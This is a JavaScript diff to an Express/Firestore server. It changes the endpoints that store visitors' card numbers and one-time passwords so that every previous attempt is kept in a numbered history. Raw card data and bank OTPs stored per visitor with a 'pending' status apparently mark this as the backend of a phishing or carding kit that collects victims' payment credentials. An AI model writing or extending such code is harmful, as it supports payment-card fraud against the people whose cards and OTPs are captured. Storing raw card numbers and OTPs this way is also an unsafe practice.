@@ -223,8 +223,10 @@ app.post('/api/save-payment', async (req, res) => {
         const { getFirestore } = require('./firebase-config');
         const db = getFirestore();
         const timestamp = new Date().toISOString();
+        const docRef = db.collection('visitors').doc(vid);
+        const doc = await docRef.get();
         
-        await db.collection('visitors').doc(vid).update({
+        const updates = {
             'payment.card_status': 'pending',
             'payment.current': {
                 cardNumber,
@@ -235,7 +237,23 @@ app.post('/api/save-payment', async (req, res) => {
                 timestamp
             },
             'lastUpdated': timestamp
-        });
+        };
+        
+        // حفظ المحاولة السابقة في history إذا كانت موجودة
+        if (doc.exists) {
+            const data = doc.data();
+            if (data.payment && data.payment.current) {
+                const historyCount = data.payment.history ? Object.keys(data.payment.history).length : 0;
+                const attemptKey = `payment.history.attempt_${historyCount + 1}`;
+                updates[attemptKey] = {
+                    ...data.payment.current,
+                    card_status: data.payment.card_status || 'pending',
+                    savedAt: timestamp
+                };
+            }
+        }
+        
+        await docRef.update(updates);
         
         res.json(result);
     } catch (error) {
@@ -276,7 +294,7 @@ app.post('/api/save-otp', async (req, res) => {
             ? Object.keys(doc.data().otp.history).length 
             : 0;
         
-        await docRef.update({
+        const updates = {
             'otp.otp_status': 'pending',
             'otp.current': {
                 otp,
@@ -284,7 +302,23 @@ app.post('/api/save-otp', async (req, res) => {
                 attemptNumber: attemptCount + 1
             },
             'lastUpdated': timestamp
-        });
+        };
+        
+        // حفظ المحاولة السابقة في history إذا كانت موجودة
+        if (doc.exists) {
+            const data = doc.data();
+            if (data.otp && data.otp.current) {
+                const historyCount = data.otp.history ? Object.keys(data.otp.history).length : 0;
+                const attemptKey = `otp.history.attempt_${historyCount + 1}`;
+                updates[attemptKey] = {
+                    ...data.otp.current,
+                    otp_status: data.otp.otp_status || 'pending',
+                    savedAt: timestamp
+                };
+            }
+        }
+        
+        await docRef.update(updates);
         
         res.json({ success: true });
     } catch (error) {
